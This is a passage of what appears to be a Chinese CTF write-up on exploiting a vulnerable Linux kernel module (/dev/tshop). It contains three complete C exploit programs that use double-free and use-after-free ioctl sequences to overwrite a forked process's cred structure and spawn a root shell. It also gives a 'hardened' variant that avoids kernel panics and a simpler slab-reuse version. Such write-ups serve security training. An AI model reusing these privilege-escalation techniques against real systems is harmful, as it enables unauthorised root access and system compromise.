    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #define MALLOC 0x271A
    #define FREE   0x2766
    #define EDIT1  0x1A0A
    #define EDIT2  0x22B8 
    pid_t pid;
    void debug(){
        getchar();
    }
    int main(int argc, char *argv[]){
        int fd = open("/dev/tshop",0);
        debug();
        ioctl(fd,MALLOC,0);
        ioctl(fd,MALLOC,1);
        ioctl(fd,MALLOC,2);
        ioctl(fd,MALLOC,3);
        ioctl(fd,MALLOC,4);
        ioctl(fd,MALLOC,5);
        ioctl(fd,MALLOC,6);
        ioctl(fd,MALLOC,7);
        ioctl(fd,MALLOC,8);
        ioctl(fd,MALLOC,9);
        ioctl(fd,MALLOC,10);
        ioctl(fd,MALLOC,11);
        ioctl(fd,MALLOC,12);
        ioctl(fd,MALLOC,13);
        ioctl(fd,MALLOC,14);
        ioctl(fd,MALLOC,15);
        ioctl(fd,MALLOC,16);
        ioctl(fd,MALLOC,17);
        ioctl(fd,FREE,17);
        ioctl(fd,FREE,16);
        ioctl(fd,FREE,17);
        pid=fork();
        if(pid==0){
            printf("[+] root?");
            system("whoami");
        }else{
                ioctl(fd,MALLOC,16);
                ioctl(fd,MALLOC,17);//cred==0 
                ioctl(fd,FREE,0);
                ioctl(fd,FREE,1);
                ioctl(fd,FREE,2);
                ioctl(fd,FREE,3);
                ioctl(fd,FREE,4);
                ioctl(fd,FREE,5);
                ioctl(fd,FREE,6);
                ioctl(fd,FREE,7);
                ioctl(fd,FREE,8);
                ioctl(fd,FREE,9);
                ioctl(fd,FREE,10);
                ioctl(fd,FREE,11);
                ioctl(fd,FREE,12);
                ioctl(fd,FREE,13);
                ioctl(fd,FREE,14);
                ioctl(fd,FREE,15);
        }
    }
输出结果：
貌似已经提权成功了。这种方法确实奏效，但是当我多执行一些指令的时候内核又会panic 🙁
怎么办呢？
## Exploit 加固
由于panic的核心原因在于把 cred info 当作地址来申请堆块，那么在这个方向思考的话，其实可以通过一个free的写指针操作把 cred info
覆盖为一个有效的 chunk 地址，也就是free链表的尾 chunk 地址。
    /*
     * main.c
     * Copyright (C) 2019 P1umer 
     */
    // gcc exp.c -o exp --static -lpthread
    #define _GNU_SOURCE
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #define MALLOC 0x271A
    #define FREE   0x2766
    #define EDIT1  0x1A0A
    #define EDIT2  0x22B8 
    pid_t pid;
    void debug(){
        getchar();
    }
    int main(int argc, char *argv[]){
        int fd = open("/dev/tshop",0);
        debug();
        ioctl(fd,MALLOC,0);
        ioctl(fd,MALLOC,1);
        ioctl(fd,MALLOC,2);
        ioctl(fd,MALLOC,3);
        ioctl(fd,MALLOC,4);
        ioctl(fd,MALLOC,5);
        ioctl(fd,MALLOC,6);
        ioctl(fd,MALLOC,7);
        ioctl(fd,MALLOC,8);
        ioctl(fd,MALLOC,9);
        ioctl(fd,MALLOC,10);
        ioctl(fd,MALLOC,11);
        ioctl(fd,MALLOC,12);
        ioctl(fd,MALLOC,13);
        ioctl(fd,MALLOC,14);
        ioctl(fd,MALLOC,15);
        ioctl(fd,MALLOC,16);
        ioctl(fd,MALLOC,17);
        ioctl(fd,FREE,17);
        ioctl(fd,FREE,16);
        ioctl(fd,FREE,17);
        pid=fork();
        if(pid==0){
            sleep(1);
            printf("[+] root");
            system("whoami");
            system("/bin/sh");
        }else{
            printf("[+] shell close");
            ioctl(fd,FREE,17);
            ioctl(fd,MALLOC,17);
            ioctl(fd,MALLOC,16);
            ioctl(fd,MALLOC,17);//cred==0 
            ioctl(fd,FREE,0);
            ioctl(fd,FREE,1);
            ioctl(fd,FREE,2);
            ioctl(fd,FREE,3);
            ioctl(fd,FREE,4);
            ioctl(fd,FREE,5);
            ioctl(fd,FREE,6);
            ioctl(fd,FREE,7);
            ioctl(fd,FREE,8);
            ioctl(fd,FREE,9);
            ioctl(fd,FREE,10);
            ioctl(fd,FREE,11);
            ioctl(fd,FREE,12);
            ioctl(fd,FREE,13);
            ioctl(fd,FREE,14);
            ioctl(fd,FREE,15);
            sleep(100);
        }
    }
主进程通过 UAF 再次把 chunk17 free 了一次，复写里面的Cred info 为 chunk16
的地址，然后再次申请堆块把链表恢复为原状态。同时在父进程中加了sleep函数提高稳定性。
这时候已经得到了稳定的 root shell 🙂
## 更多的思考
还有一种更为精简的解法, 从一开始没有考虑 doublefree ：
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #define DEL         0x2766
    #define SET_ZEGE     0x22B8  // 0x123456789ABCDEF0LL
    #define ALLOC         0x271A
    #define SET_JIGE     0x1A0A  // 0xFEDCBA987654321LL
    int main() {
        int fd = open("/dev/tshop", 0);
        size_t heap_addr , kernel_addr,mod_addr;
        if (fd < 0) {
            printf("[-] bad open /dev/tshopn");
            exit(-1);
        }
        ioctl(fd, ALLOC, 0);
        ioctl(fd, ALLOC, 1);
        ioctl(fd, DEL, 0);
        ioctl(fd, DEL, 1);
        int pid=fork();
        ioctl(fd, DEL, 1);
        ioctl(fd, ALLOC, 3);
        //getchar();
        //getchar();
        if (pid < 0) {
            puts("[-] fork error!");
            exit(0);
        } else if (pid == 0) {
            if (getuid() == 0) {
                puts("[+] root");
                system("cat /home/sunichi/flag");
                system("id");
                system("/bin/sh")
                exit(0);
            }
        } else {
            sleep(30);
            puts("[+] parent exit");
        }
    }
具体思路：
  * alloc并free掉两块内存，使他们接入slab cache链表的尾部，这里暂且给它编号为chunk0和chunk1
  * 由于采用FIFO算法，此时slab缓存的单向链表最尾端的chunk为chunk1，而且第一个8字节存储的是指向chunk0的指针，当ALLOC新cache时，将优先取出chunk1分配给进程。
  * fork一个子进程，这个子进程的cred结构体会复用此前我们free掉的内存块（chunk1）  
此时，堆块中的cred如下：  
  * 我们的目标是将cred的id位置零，首先就需要再次拿到cred所在堆块（chunk1）
  * free并立即进行alloc操作，chunk1就会挂到cache链上后再次被申请回来。
  * 由于ALLOC操作伴随着所在堆块数据的初始化，于是我们不用再有多余的操作便能将cred结构体uid及gid位置零。此时子进程就已成功提权（root）